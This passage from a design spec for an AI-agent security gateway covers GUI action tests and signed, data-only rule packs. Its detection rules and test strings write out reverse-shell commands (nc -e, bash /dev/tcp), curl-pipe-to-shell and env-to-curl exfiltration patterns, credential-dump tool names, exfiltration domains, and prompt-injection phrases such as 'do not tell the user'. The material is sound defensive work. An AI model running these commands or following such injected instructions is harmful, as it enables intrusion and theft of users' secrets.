| 5 | button opacity 0 / size 1×1 | DENY GUI-010 |
| 6 | element `covered=true` | DENY GUI-010 |
| 7 | button "Pay now" | ASK_HUMAN 75 (DENY 85 if `block_financial`) |
| 8 | button "Transfer ownership" | ASK_HUMAN (admin) |
| 9 | button "Publish release" | ASK_HUMAN (publish) |
| 10 | submit button with `form_action=https://evil.example/c` | ASK_HUMAN GUI-030 |
| 11 | `input[type=file]` click | DENY GUI-031 |
| 12 | link `href=…/setup.exe` | DENY GUI-032 |
| 13 | type into `password` | DENY GUI-040 |
| 14 | type text containing `AKIAABCDEFGHIJKLMNOP` into textbox | DENY GUI-041 |
| 15 | type text containing SSN | ASK_HUMAN GUI-041 |
| 16 | type 3000 chars | schema 422 (max 2000) |
| 17 | navigate `javascript:alert(1)` | DENY GUI-020 |
| 18 | navigate `http://169.254.169.254/` | DENY (NET-005 via GUI-020) |
| 19 | navigate `https://evil.example/` | ASK_HUMAN (NET-008) |
| 20 | press Enter with focused "Delete account" button | ASK_HUMAN (GUI-050→001) |
| 21 | click with stale snapshot | DENY GUI-080 (REPLAN) |
| 22 | click on benign link while page taint level 2 | ALLOW; click on submit while taint 2 | ASK_HUMAN GUI-060 |
| 23 | Hindi label "डिलीट" button | ASK_HUMAN (destructive) |
| 24 | fullwidth "ＤＥＬＥＴＥ" button | ASK_HUMAN (NFKC) |
| 25 | `tab_count=4` | DENY GUI-090 |
Integration (needs Docker): 26 verify-then-act blocks a page that moves an invisible overlay under the pointer between snapshot and click (fixture page with `setTimeout` overlay) → `OCCLUDED`, no click delivered (assert page counter unchanged). 27 From the CLI sandbox, `curl http://ag-br-<run>:3000` / `nc` to CDP fails. 28 Download link click produces no file on disk. 29 Browser traffic appears in `egress_events` with the run id; a blocked navigation shows `GUI_NAV_BLOCKED`.

## 5.10 §5 Acceptance tests (MUST pass) and scope tiers
- **[MVP]:** `gui.navigate`, `gui.snapshot`, `gui.click`, `gui.type` with lexicon classification (GUI-001, 002, 020, 040, 041, 080), snapshot/refs, browser containment 5.2, golden 1–25 minus those needing SHOULD features.
- **[SHOULD]:** verify-then-act (5.6.3 steps 3–5), screenshots with highlight, `gui.select`, `gui.press`, deceptive-element checks (GUI-010/011), taint (GUI-060).
- **[MAY]:** multi-tab support, iframe OOPIF, `name_text_mismatch`.
- Performance: `GuiAnalyzer` p99 ≤ 2 ms; `describe` per element p95 ≤ 15 ms; snapshot of a 300-node page p95 ≤ 700 ms (report measured; these are targets, not guarantees).

---

# §6 — RULE PACKS & SIGNED FEEDS ("the ad-blocker for agent behavior")

## 6.1 Purpose and architecture

Rule packs let security knowledge be **updated without redeploying the hub**: signed, versioned, data-only bundles that add detections. Design principles (each MUST be implemented and tested):

1. **Data-only.** Packs contain declarative rules — no code execution (custom code lives in the WASM/Python plugin path of §7).
2. **Tighten-only by default.** A pack can add `ASK_HUMAN`/`DENY` findings. It can never suppress or downgrade built-in findings. Only keys holding the `allow` capability may contribute **allow-list additions** (merged into policy at snapshot build, §7) — and never override any finding with severity ≥ 60.
3. **Authenticated.** Ed25519 detached-envelope signatures verified against a local trust store; key revocation supported.
4. **Safe to activate.** Schema/limits validation → embedded self-tests → false-positive canary on a benign corpus → atomic swap; failure keeps the **last known good** set.
5. **Rollback-protected.** Versions must increase (explicit admin rollback exists and is audited).
6. **Fast.** Compiled matching (reversed-label domain trie, Aho–Corasick multi-literal, RE2 regex) with per-action budget ≤ 3 ms p99 at 5,000 rules (measure and report).

```
Feed server ──HTTPS (via egress proxy, identity system:feeds, A3)──► FeedSyncer ──► Verifier ──► Compiler ──► CanaryCheck ──► atomic swap
Local file / POST /v1/rulepacks/install ──────────────────────────────────────────►(same pipeline)
Active CompiledRuleSet (immutable, RCU pointer) ──► RulesAnalyzer (hub P4, after surface analyzers) ──► Findings RP-<pack>-<rule>
                                              └──► Redactor patterns, taint patterns, GUI lexicon, domain lists → consumed by §2–§5 via PolicySnapshot (§7)
```

## 6.2 Data models (`rules/models.py`)

### 6.2.1 Envelope and pack
```python
class Signature(BaseModel):
    alg: Literal["ed25519"]; key_id: str = Field(pattern=r"^[a-z0-9][a-z0-9\-_.]{2,60}$"); sig_b64: str

class RulePackEnvelope(BaseModel):
    model_config = ConfigDict(extra="forbid")
    payload: RulePack
    signature: Signature                               # signature covers canonical_json(payload) (Part 1 §0.4)

class RulePack(BaseModel):
    model_config = ConfigDict(extra="forbid")
    schema_version: Literal[1] = 1
    pack_id: str = Field(pattern=r"^[a-z0-9][a-z0-9\-]{2,40}$")
    name: str = Field(max_length=100); description: str = Field(default="", max_length=1000)
    version: str                                       # semver "MAJOR.MINOR.PATCH"; compare as tuple(int)
    channel: Literal["stable","beta"] = "stable"
    publisher: str = Field(max_length=100)
    published_at: str; expires_at: str | None = None   # RFC3339; None = no expiry
    min_agentguard: str = "1.0.0"
    rules: list[Rule] = Field(max_length=5000)
    lexicon_additions: dict[str, list[str]] = {}       # GUI categories (§5.5.1): {"destructive":["nuke"],...}
    taint_patterns: list[TaintPattern] = []            # extend Part 1 §3.8.1
    redact_patterns: list[RedactPattern] = []          # extend Redactor (§6.9)
    allow_additions: AllowAdditions | None = None      # honored only with key capability "allow"
    tags: list[str] = []
```
### 6.2.2 Rule types (discriminated by `type`)
```python
Surface = Literal[
  "cli.command_raw","cli.command_resolved","cli.argv","cli.path",
  "net.url","net.host","net.request_body","net.request_headers","net.response_body",
  "fs.path","fs.write_content","fs.read_content",
  "gui.label","gui.typed_text","gui.url"]

class RuleBase(BaseModel):
    model_config = ConfigDict(extra="forbid")
    rule_id: str = Field(pattern=r"^[A-Za-z0-9_]{1,40}$")
    enabled: bool = True
    verdict: Literal["ASK_HUMAN","DENY","HALT"]         # HALT requires key capability "halt"
    severity: int = Field(ge=40, le=100)                 # packs cannot emit sub-40 (they'd be no-ops)
    reason_code: str = "RULEPACK_MATCH"                  # MUST be registered; default generic
    message: str = Field(max_length=300)
    action_types: list[ActionType] | None = None         # None = all
    tags: list[str] = []; references: list[str] = []
    test_vectors: list[TestVector] = Field(min_length=1) # REQUIRED (≥1 match and ≥1 no-match once counted; see 6.4 step 8)

class TestVector(BaseModel):
    surface: Surface; input: str = Field(max_length=4096); expect: Literal["match","nomatch"]

class LiteralRule(RuleBase):      type: Literal["literal"]
    surfaces: list[Surface]; values: list[str] = Field(max_length=20000)     # Aho–Corasick; case-fold; each 2–200 chars
    match: Literal["substring","word"] = "substring"
class RegexRule(RuleBase):        type: Literal["regex"]
    surfaces: list[Surface]; pattern: str = Field(max_length=512); flags: list[Literal["i","m","s"]] = []
    validators: list[Literal["luhn","verhoeff","entropy>=4.0","entropy>=4.5","min_len_16"]] = []
class DomainRule(RuleBase):       type: Literal["domain"]
    patterns: list[str] = Field(max_length=20000)     # Part 1 §3.5 semantics: "x.com" apex, "*.x.com", "**.x.com"
    applies_to: list[Literal["net.host","gui.url"]] = ["net.host","gui.url"]
class ArgvRule(RuleBase):         type: Literal["argv"]
    command: str                                       # basename, e.g. "curl" (case-fold)
    flags_any: list[str] = []                          # normalized flags (e.g. "-k","--insecure")
    args_glob_any: list[str] = []                      # globs on static arg text
    require_pipeline_next: list[str] = []              # e.g. next stage basename in {"sh","bash"}
class PathRule(RuleBase):         type: Literal["path_glob"]
    globs: list[str]; ops: list[Literal["read","write","delete","any"]] = ["any"]   # applies to cli.path / fs.path
class GuiLabelRule(RuleBase):     type: Literal["gui_label"]
    terms: list[str]; category: str                    # extends lexicon; category must exist or be "custom"

class TaintPattern(BaseModel):  id: str; pattern: str; weight: int = Field(ge=1, le=3); test_vectors: list[TestVector]
class RedactPattern(BaseModel): kind: str = Field(pattern=r"^[a-z0-9_]{2,30}$"); pattern: str; test_vectors: list[TestVector]
class AllowAdditions(BaseModel):
    domains: list[str] = []; commands: list[str] = []; pkg_indexes: list[str] = []
```
`Rule = Annotated[Union[LiteralRule, RegexRule, DomainRule, ArgvRule, PathRule, GuiLabelRule], Field(discriminator="type")]`.

### 6.2.3 Trust, feeds, state
```python
class TrustKey(BaseModel):
    key_id: str; publisher: str
    public_key_b64: str                                # 32-byte Ed25519 public key
    capabilities: set[Literal["ask","deny","halt","allow","lexicon","taint","redact"]] = {"ask","deny","lexicon","taint","redact"}
    allowed_pack_ids: list[str] | Literal["*"] = "*"
    not_before: str; not_after: str | None
    revoked: bool = False; revoked_at: str|None = None; added_by: str; added_at: str

class FeedSubscription(BaseModel):
    feed_id: str                                       # "fed_<ulid>"
    url: str                                           # https://… (or http://localhost… if AG_DEV_MODE)
    pack_id: str; channel: Literal["stable","beta"] = "stable"
    interval_s: int = Field(default=3600, ge=300, le=86400)
    enabled: bool = True
    etag: str | None; last_modified: str | None
    last_checked_at: str | None; last_success_at: str | None; last_error: str | None
    consecutive_failures: int = 0
    status: Literal["OK","STALE","ERROR","DISABLED"] = "OK"

class PackStatus(StrEnum): ACTIVE="ACTIVE"; INSTALLED="INSTALLED"; REJECTED="REJECTED"; QUARANTINED="QUARANTINED"; DISABLED="DISABLED"; EXPIRED="EXPIRED"; REVOKED="REVOKED"; SUPERSEDED="SUPERSEDED"
```
### 6.2.4 SQL (`schema.sql` additions)
```sql
CREATE TABLE trust_keys (key_id TEXT PRIMARY KEY, publisher TEXT NOT NULL, public_key_b64 TEXT NOT NULL,
  capabilities_json TEXT NOT NULL, allowed_pack_ids_json TEXT NOT NULL, not_before TEXT NOT NULL, not_after TEXT,
  revoked INTEGER NOT NULL DEFAULT 0, revoked_at TEXT, added_by TEXT NOT NULL, added_at TEXT NOT NULL);
CREATE TABLE rulepacks (pack_id TEXT NOT NULL, version TEXT NOT NULL, sha256 TEXT NOT NULL, key_id TEXT NOT NULL,
  status TEXT NOT NULL, status_reason TEXT, installed_at TEXT NOT NULL, expires_at TEXT, rule_count INTEGER NOT NULL,
  path TEXT NOT NULL, meta_json TEXT NOT NULL DEFAULT '{}', PRIMARY KEY (pack_id, version));
CREATE TABLE rulepack_active (pack_id TEXT PRIMARY KEY, version TEXT NOT NULL, enabled INTEGER NOT NULL DEFAULT 1, activated_at TEXT NOT NULL);
CREATE TABLE feeds (feed_id TEXT PRIMARY KEY, url TEXT NOT NULL, pack_id TEXT NOT NULL, channel TEXT NOT NULL, interval_s INTEGER NOT NULL,
  enabled INTEGER NOT NULL, etag TEXT, last_modified TEXT, last_checked_at TEXT, last_success_at TEXT, last_error TEXT,
  consecutive_failures INTEGER NOT NULL DEFAULT 0, status TEXT NOT NULL);
CREATE TABLE rule_hits (rule_id TEXT NOT NULL, day TEXT NOT NULL, action_type TEXT NOT NULL, verdict TEXT NOT NULL, hits INTEGER NOT NULL,
  PRIMARY KEY (rule_id, day, action_type, verdict));
```
Pack files stored at `${AG_PACKS_DIR}/<pack_id>/<version>.json` (the whole envelope, byte-exact as received).

## 6.3 API contracts (all admin unless noted)

- **`GET /v1/rulepacks`** → `{"items":[{"pack_id":"pii-shield","name":"PII Shield","active_version":"1.2.0","status":"ACTIVE","enabled":true,"rule_count":24,"key_id":"agentguard-community-1","expires_at":"2027-01-01T00:00:00Z","stale":false,"installed_versions":["1.1.0","1.2.0"]}]}`
- **`GET /v1/rulepacks/{pack_id}?version=`** → pack metadata + rule summaries (`rule_id,type,verdict,severity,reason_code,message,hits_24h`); never returns pattern bodies for `redact_patterns` (avoid leaking detector internals? not required — return everything; it is not secret).
- **`POST /v1/rulepacks/install`** body = `RulePackEnvelope` JSON → `201`
```json
{"pack_id":"reverse-shells","version":"1.0.3","status":"ACTIVE","rule_count":18,"activated":true,
 "validation":{"schema":"ok","signature":"ok","limits":"ok","self_tests":{"passed":54,"failed":0},"fp_canary":{"corpus":1200,"deny":0,"ask":9,"ask_rate":0.0075}},
 "ledger_idx":1201}
```
Errors: `422 RULEPACK_INVALID` (with `details.stage` ∈ `schema|signature|trust|limits|regex|self_test|expiry|rollback|capability|fp_canary` and `details.errors[]`).
- **`POST /v1/rulepacks/{pack_id}/disable|enable`** → `200`; ledger `rulepack.state_changed` (durable).
- **`POST /v1/rulepacks/{pack_id}/rollback`** body `{"version":"1.1.0","reason":"FP storm"}` → activates an already-installed older version (bypasses monotonic check; audited).
- **Feeds:** `GET /v1/feeds`; `POST /v1/feeds` `{"url","pack_id","channel","interval_s"}` → `201 FeedSubscription`; `PUT /v1/feeds/{id}`; `DELETE /v1/feeds/{id}`; `POST /v1/feeds/{id}/sync` → forces immediate sync → `{"result":"updated|not_modified|rejected|error","version":"1.2.0","detail":...}`.
- **Trust:** `GET /v1/trust/keys`; `POST /v1/trust/keys` `{"key_id","publisher","public_key_b64","capabilities":[...],"allowed_pack_ids":"*","not_after":null}` (ledger `trust.key_changed`, durable); `POST /v1/trust/keys/{key_id}/revoke` → marks revoked, **immediately deactivates** all ACTIVE packs signed solely by that key (status `REVOKED`), recompiles. The **bootstrap trust** file `${AG_TRUST_DIR}/bootstrap_keys.json` is loaded at first start only (dev convenience) and every entry is logged.
- **`POST /v1/debug/analyze/rules`** body `{"surfaces":{"cli.command_resolved":"nc -e /bin/sh 1.2.3.4 4444","net.url":"…"},"action_type":"cli.exec"}` → `{"matches":[{"rule_id":"RP-reverse-shells-NC_E","verdict":"DENY","severity":95,"surface":"cli.command_resolved"}],"elapsed_ms":0.4}`.
- **`GET /v1/rules/stats?days=7`** → per-rule hit counts (feeds the evaluation harness FP analysis).

Events on WS/ledger: `rulefeed.updated` `{pack_id, version, action:"installed|rejected|quarantined|not_modified_after_error|rolled_back", reason, sha256, key_id, rule_count}` (durable=True).

## 6.4 Verification and activation pipeline (`rules/verifier.py`; exact order; abort at first failure)

```
Input: raw bytes (≤ 5 MiB), source ("feed:<id>" | "upload:<admin>" | "file")
1. SIZE/ENCODING: len ≤ 5 MiB; UTF-8; JSON parse with strict duplicate-key rejection (object_pairs_hook); max nesting depth 20. → stage=schema
2. SCHEMA: RulePackEnvelope.model_validate (extra=forbid). → schema
3. LIMITS: rules ≤ 5000; Σ literal values ≤ 20000 (per pack) and ≤ 60000 (across all packs); each regex ≤ 512 chars; each literal 2–200 chars;
           test_vectors ≤ 20 per rule; total pack rules unique rule_id. → limits
4. TRUST: key = trust_keys[signature.key_id] exists, not revoked, now ∈ [not_before, not_after], pack_id permitted by allowed_pack_ids. → trust
5. SIGNATURE: Ed25519 verify(public_key, canonical_json(payload.model_dump(mode="json")), b64decode(sig_b64)). Use PyNaCl `VerifyKey.verify`. → signature
6. TIME: published_at ≤ now + 300 s; expires_at is None or > now. Expired pack from a feed → reject; expired *installed* pack handled at runtime (6.7). → expiry
7. ROLLBACK: if pack_id installed: new version tuple must be > max installed version, else reject unless explicit rollback endpoint. Identical version + identical sha256 → `not_modified` (no-op). Identical version + different hash → reject (tamper/republish). → rollback
8. CAPABILITIES: every rule verdict allowed: ASK needs "ask", DENY needs "deny", HALT needs "halt"; lexicon_additions need "lexicon"; taint_patterns "taint"; redact_patterns "redact"; allow_additions "allow". Also reason_code ∈ registry (Part 1 §0.5, A4). → capability
9. REGEX/STATIC: compile every regex with RE2 (`re2` module). Unsupported syntax (lookaround, backrefs) → reject. If RE2 unavailable, fallback `regex` module with 20 ms per-match timeout AND static ReDoS heuristic rejecting nested quantifiers `(...+)+`, `(...*)*`, `(a|a)+`, and > 3 unbounded quantifiers in sequence. Glob patterns validated. Domain patterns validated per Part 1 §3.5 syntax. → regex
10. SELF-TESTS: evaluate every test_vector with the compiled matcher; every `expect` must hold. Each rule must have ≥ 1 vector; each regex/literal/domain/argv rule needs at least one "match" **and** one "nomatch". Failures listed. → self_test
11. BUILD candidate CompiledRuleSet = (all currently active packs except this pack_id) ∪ (this pack). 
12. FP CANARY: run the candidate set over the benign corpus (`tests/golden/benign_corpus.txt` shipped + `${DATA_DIR}/benign_samples/*.jsonl` recorded from previous ALLOWed actions if enabled) — each sample is (action_type, surfaces). Compute rates of new DENY/HALT and new ASK relative to the current active set. Reject if new DENY/HALT rate > 0.5 % or new ASK rate > 3 % (thresholds in `policy.rules.fp_canary`). Corpus < 200 samples → skip with a warning flag in the response. → fp_canary
    Outcome on failure at step 12: pack stored with status QUARANTINED (kept for review; admin can force with `?force=true`, audited) — other failures: status REJECTED (stored only for feeds, with `status_reason`, for diagnostics).
13. ACTIVATE: write pack file atomically; DB transaction: mark previous ACTIVE version SUPERSEDED, insert new ACTIVE, update rulepack_active; swap `app.state.ruleset = candidate` (single reference assignment; readers hold their own reference for the duration of an action — RCU).
14. LEDGER: rulefeed.updated (durable). EventBus publish. Return validation report.
```
Activation is **all-or-nothing per pack**; the previously active version is untouched until step 13.

## 6.5 Compiled rule set and matching (`rules/compiler.py`, `rules/analyzer.py`)

### 6.5.1 `CompiledRuleSet` (immutable)
- `domain_trie`: reversed-label trie; nodes carry rule indices for `exact`, `wildcard(*.)`, `deep(**.)` semantics; lookup O(labels).
- `literal_automata`: one `pyahocorasick.Automaton` per surface built from case-folded values (NFKC → casefold); on match check `word` boundaries if required; map to rule index.
- `regex_sets`: per surface, a list of `(rule_idx, compiled RE2 pattern)`; for surfaces with many regexes, RE2 `Set` (multi-pattern) is used to find candidate indices in one pass, then individual patterns confirm and validators run.
- `argv_index`: dict basename → list of ArgvRule.
- `path_rules`: list of (compiled glob, ops, rule_idx) using the same glob engine as Part 2 §4.5.2.
- `lexicon`: merged category → terms (built-in + packs).
- `taint_patterns`, `redact_patterns` lists.
- `pack_meta`: per pack `{version, sha256, key_id, expires_at}`; `hash` = sha256 of sorted `(pack_id, version, sha256)` — exposed as `rules_hash` in decisions/ledger.

### 6.5.2 Surface extraction (`rules/surfaces.py`, from `AnalysisContext`)
| Action | Surfaces produced |
|---|---|
| `cli.exec` | `cli.command_raw` (original string); `cli.command_resolved` (each SimpleCmd rendered `basename arg1 arg2` with static args, dynamic args as `<DYN>`, joined by ` ; ` / ` | ` preserving pipeline structure; includes recursively parsed `bash -c` content); `cli.argv` (structured — used by `argv` rules directly from `ctx.scratch["cli_ir"]`); `cli.path` (every resolved path with op tag: read/write/delete inferred from command + redirects) |
| `net.http` | `net.url` (canonical), `net.host`, `net.request_body` (decoded text ≤ 256 KiB), `net.request_headers` (`Name: value` lines excluding hop-by-hop) |
| `fs.*` | `fs.path`, `fs.write_content` (decoded text ≤ 256 KiB) |
| `gui.*` | `gui.label` (name + text + selected attrs), `gui.typed_text`, `gui.url` |
| (post-exec / inbound) | `net.response_body`, `fs.read_content` — used only for `taint_patterns`, never for action verdicts |
Scan caps: `policy.rules.max_scan_bytes` = 262,144 per surface (truncate; note `scanned_truncated` in evidence).

### 6.5.3 `RulesAnalyzer.analyze(ctx)` algorithm (pure, ≤ 3 ms p99 target, timeout 50 ms)
```
rs = ctx.policy.ruleset        # CompiledRuleSet snapshot taken at PolicySnapshot creation (§7) – stable during the action
surfaces = build_surfaces(ctx)
findings = []
for surface, text in surfaces.items():
    norm = casefold_nfkc(text)
    for rule_idx in rs.literal_automata[surface].iter(norm) : apply action_types filter; add Finding
    for rule_idx in rs.regex_sets[surface].match_candidates(text): confirm + validators; add Finding
for domain surfaces: rs.domain_trie.lookup(host) → Finding
for cli.exec: for cmd in cli_ir.commands: for rule in rs.argv_index[cmd.basename]: evaluate flags_any/args_glob_any/require_pipeline_next
for path rules: over cli.path/fs.path items with op
Deduplicate: at most 1 finding per (rule_id, surface); at most 25 findings total (keep highest severity; note `dropped`).
Finding: source="rules", rule_id=f"RP-{pack_id}-{rule.rule_id}", reason_code=rule.reason_code, severity=rule.severity,
         verdict_hint=rule.verdict, message=rule.message, evidence={"pack":pack_id,"version":v,"surface":surface,"match_preview": redacted ≤ 60 chars}
Increment in-memory hit counters (flushed to rule_hits every 30 s).
```
Exceptions per rule are caught and skipped with a `RULEPACK_ERROR` finding (severity 40, ASK_HUMAN) **only once per action**; a rule that errors 3 times in 1 minute is auto-disabled in memory (`RULEPACK_ERROR` event) — but never silently disables detection without ledger `rulepack.state_changed`.

### 6.5.4 Merge semantics with built-ins
Rules findings enter the hub merge (Part 1 P5) like any other finding — verdict = max over all. Consequently packs **cannot** lower a verdict. HALT from packs is honored only for keys with `halt` (verified at install).

## 6.6 Feed synchronization (`rules/feeds.py`)

`FeedSyncer` runs as an `asyncio` background task (one loop; per-feed schedule with jitter ±10 %).
```
for feed in due(feeds where enabled and now >= next_due):
    1. Request via egress proxy identity system:feeds (A3): GET feed.url, headers If-None-Match: etag, If-Modified-Since, Accept: application/json,
       User-Agent: AgentGuard-FeedSync/1.0; timeout 10 s; max size 5 MiB (streamed, abort on excess); only 200/304 accepted; ≤ 2 redirects, each re-checked against feed_allow_domains.
    2. 304 → last_checked_at=now; status OK; done.
    3. 200 → pass bytes to the verification pipeline (6.4) with source "feed:<id>"; record ETag/Last-Modified only on successful activation OR `not_modified` result.
    4. Failure (network/HTTP/verify): consecutive_failures += 1; last_error stored; exponential backoff next_due = now + min(interval * 2^failures, 6 h) + jitter;
       status = ERROR; if now > active.expires_at (or last_success_at older than 3×interval and pack has expiry) → status STALE.
```
**Security invariants:** feed URL scheme `https` only (`http://localhost`/`file://` only when `AG_DEV_MODE=true`); the feed URL host MUST be in `policy.rules.feed_allow_domains`; the payload is trusted **only** after signature verification — TLS is transport hygiene, not trust; a feed serving an older version is rejected by the monotonic rule (replay/rollback protection); `not_after` on keys limits blast radius.

### 6.6.1 Demo feed server (`tools/feedserver.py`) **[SHOULD]**
Tiny FastAPI app: `GET /feeds/{pack_id}/latest.json` serving `packs/<pack_id>/latest.json` with strong `ETag` (sha256) and `Last-Modified`; `POST /admin/publish` (local token) accepts an envelope and atomically replaces `latest.json`. Used to demo "publish a new rule at T; agent's next matching action is blocked at T+≤30 s" (set demo feed `interval_s` minimum in dev mode to 5 s via `AG_DEV_MODE=true`, otherwise 300 s).

### 6.6.2 Signing tool (`tools/agentguard_pack.py`, `python -m agentguard.tools.pack`)
- `keygen --key-id ID --out DIR` → writes `ID.key` (32-byte seed, base64, chmod 600) and `ID.pub` (base64).
- `sign --key DIR/ID.key --key-id ID pack_payload.json --out pack.json` → wraps into envelope with signature over `canonical_json(payload)`.
- `verify pack.json --trust keys.json` → runs steps 1–10 of 6.4 offline; exit code 0/1; prints stage.
- `lint pack_payload.json` → schema, limits, regex compile, self-tests.
- `bump --patch|--minor|--major pack_payload.json` (updates `version`, `published_at`).

## 6.7 Runtime states, expiry and failure semantics

| Situation | Behavior (fail-closed unless noted) |
|---|---|
| Pack `expires_at` passed, feed unreachable | Pack **stays active** (it only tightens), status `STALE`, UI warning, ledger `rulepack.state_changed` once; findings from a stale pack get message suffix `[stale rules]` and reason code stays. **Exception:** packs whose `allow_additions` are present: allow-lists are dropped at the next snapshot build (fail closed) |
| Hard expiry (`expires_at + 7 days`) | pack status `EXPIRED`, disabled only if it contains `allow_additions`; tightening rules remain until admin disables (rationale: removing detections on a timer is riskier than keeping them) — configurable `policy.rules.hard_expire_disables_all` default `false` |
| Signing key revoked | packs signed by it → `REVOKED` and removed from the active set immediately (a revoked key indicates compromise; detection removal is accepted, and an admin alert event is emitted) |
| Verification failure of new version | keep last known good; record `rejected` |
| FP canary failure | `QUARANTINED`, not activated; admin can inspect `validation.fp_canary` and `force` |
| Rule throws at runtime | 6.5.3 |
| Trust store empty | feeds cannot install; built-in rules (code) still enforce; `/ready` shows `rules:"builtin-only"` |
| Compiled set build error | activation aborted; previous set retained |
| Memory/latency regression (`RulesAnalyzer` > 10 ms p99 over 1000 actions, tracked at runtime) | emit `RULEPACK_ERROR` warning event; **do not** auto-disable |
| Clock skew > 5 min | `published_at` future-dated rejected; expiry checks use monotonic offset from last NTP-independent bootstrap — document and log |

## 6.8 Built-in rule packs shipped in `rulepacks/` (signed at build time with a repo dev key; keys in `bootstrap_keys.json`) **[MVP: 3 packs, ≥ 12 rules each]**

Pack contents (write as real pack payload JSON with test vectors; the implementing agent authors the JSON files, following these specifications):

1. **`owasp-agent-top`** (OWASP-*inspired* guardrails for agent misuse; do not claim official OWASP endorsement) — capabilities `ask,deny`:
   - `REV_SHELL_BASH_TCP` regex on `cli.command_resolved`: `(?i)bash\s+-i\s*>&\s*/dev/tcp/` → DENY 95
   - `REV_SHELL_NC_E` argv `nc|ncat|netcat` with flags `-e`/`-c`/`--exec` → DENY 95
   - `REV_SHELL_MKFIFO` regex `mkfifo\s+\S+;\s*(nc|ncat|telnet)` → DENY 92
   - `REV_SHELL_PYTHON_SOCKET` regex `python[0-9.]*\s+-c\s+.{0,200}socket.{0,200}(connect|subprocess|dup2)` → DENY 92
   - `PIPE_TO_SHELL_ANY` regex `(curl|wget)[^|;&]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b` → DENY 95 (defense-in-depth duplicate of CLI-010)
   - `CRYPTO_MINER` literal (`xmrig`,`minerd`,`cpuminer`,`stratum+tcp://`,`stratum+ssl://`,`nicehash`) on cli/net surfaces → DENY 90
   - `CRED_DUMP_MIMIKATZ_LIKE` literal (`mimikatz`,`lazagne`,`secretsdump`,`hashdump`) → DENY 92
   - `SSH_KEY_EXFIL_PATH` path_glob `**/.ssh/id_*` ops any → DENY 88
   - `HISTORY_TAMPER` regex `(?i)\b(history\s+-c|unset\s+HISTFILE|export\s+HISTFILE=/dev/null|shred\s+.*\.bash_history)` → ASK_HUMAN 60
   - `PROMPT_INJECTION_EXFIL_INSTR` (net.response_body via `taint_patterns`): add T11 weight 2 `(?i)(send|post|upload|forward)\s+(the\s+)?(contents?\s+of\s+)?(\.env|\.ssh|credentials|api\s*keys?)\s+to` ; T12 weight 2 `(?i)do\s+not\s+(tell|inform|alert)\s+the\s+user`
   - `TYPOSQUAT_PKG` literal (a curated 200-name list of known typosquats, e.g. `reqeusts`,`python-dateutils`,`colourama`,`urllib4`,`beautifulsup4`) on `cli.command_resolved` where the command is a package installer (use regex `\b(pip3?|npm|yarn)\s+(install|add)\b[^;&|]*` with literal names) → DENY 85 (implement as `regex` rule per name group; `literal` cannot see the installer context → specify: LiteralRule `values`, `surfaces:["cli.command_resolved"]`, `match:"word"`, plus `action_types:["cli.exec"]`; message includes "possible typosquat")
   - `EXFIL_SINKS` domain patterns: `webhook.site`, `*.requestcatcher.com`, `*.pipedream.net`, `*.burpcollaborator.net`, `*.oast.*` (`**.oast.pro`, `**.oast.live`, `**.interact.sh`) → DENY 90
2. **`pii-shield`** — capabilities `ask,deny,redact`:
   `redact_patterns` + regex rules on `net.request_body|net.url|gui.typed_text|fs.write_content`: `STRIPE_LIVE_KEY` `\bsk_live_[0-9A-Za-z]{24,}\b` DENY 92; `GOOGLE_API_KEY` `\bAIza[0-9A-Za-z_\-]{35}\b` DENY 88; `TWILIO_SID` `\bAC[a-f0-9]{32}\b` ASK 60; `SENDGRID_KEY` `\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b` DENY 90; `NPM_TOKEN` `\bnpm_[A-Za-z0-9]{36}\b` DENY 90; `PYPI_TOKEN` `\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_\-]{50,}\b` DENY 90; `AZURE_STORAGE_KEY` `AccountKey=[A-Za-z0-9+/=]{60,}` DENY 90; `GCP_SERVICE_ACCOUNT` `"type"\s*:\s*"service_account"` DENY 90; `IBAN` `\b[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}\b` with mod-97 validator (add validator `iban`) ASK 55; `IN_UPI_ID` `\b[a-zA-Z0-9.\-_]{2,}@(oksbi|okhdfcbank|okicici|okaxis|ybl|ibl|axl|paytm)\b` ASK 55; `IN_PHONE_BULK` (≥5 numbers) via regex + threshold `min_count` (extend `RegexRule` with optional `min_count:int=1`) ASK 50; `US_PASSPORT_LIKE` skip. (Add `iban` to validators and `min_count` to `RegexRule`.)
3. **`strict-dev-sandbox`** — capabilities `ask,deny`:
   `PKG_INDEX_OVERRIDE` argv `pip|pip3` flags `--index-url`,`-i`,`--extra-index-url`,`--trusted-host` DENY 85; `NPM_REGISTRY_OVERRIDE` argv `npm|yarn|pnpm` flags `--registry` DENY 85; `PIP_URL_INSTALL` regex `\bpip3?\s+install\b[^;&|]*(https?://|git\+|ssh://)` ASK 60; `NPM_SCRIPT_URL` regex `\bnpm\s+(i|install|add)\b[^;&|]*(https?://|git\+|github:)` ASK 60; `CURL_INSECURE` argv `curl` flags `-k`,`--insecure` ASK 60; `WGET_NO_CERT` argv `wget` flags `--no-check-certificate` ASK 60; `GIT_HOOK_SETUP` path_glob `.git/hooks/**` ops write ASK 65; `DOCKERFILE_PRIV` regex on `fs.write_content` `(?im)^\s*(USER\s+root|RUN\s+.*curl[^|]*\|\s*(ba)?sh)` ASK 55 (action_types fs.write, path glob filtered by test vector); `MAKE_SUDO` regex `(?m)^\t.*\bsudo\b` on `fs.write_content` ASK 55; `SETUP_PY_NETWORK` regex on `fs.write_content` for `setup.py` containing `urllib|requests|socket|subprocess` ASK 50 (requires `fs.path` co-condition → implement via `RegexRule.path_glob_any: list[str]` optional field restricting to matching `fs.path`; add this field); `ENV_PRINT_EXFIL` regex `\b(env|printenv)\b[^|;]*\|\s*(curl|wget|nc)\b` DENY 90.

Each rule MUST ship ≥ 1 match and ≥ 1 nomatch vector. The build script `tools/build_packs.py` signs the pack payloads in `rulepacks/src/*.json` into `rulepacks/*.json` with the dev key and verifies them through the same pipeline (CI check).

## 6.9 Redactor (`rules/redactor.py`, A8)
```python
@dataclass
class RedactionResult: text: str; kinds: list[str]; count: int
class Redactor:
    def __init__(self, builtin: list[tuple[str, re.Pattern, Callable|None]], pack_patterns: list[...], canary_matcher: CanaryMatcher|None): ...
    def redact(self, text: str, *, surface: str, max_bytes: int = 262_144) -> RedactionResult
```
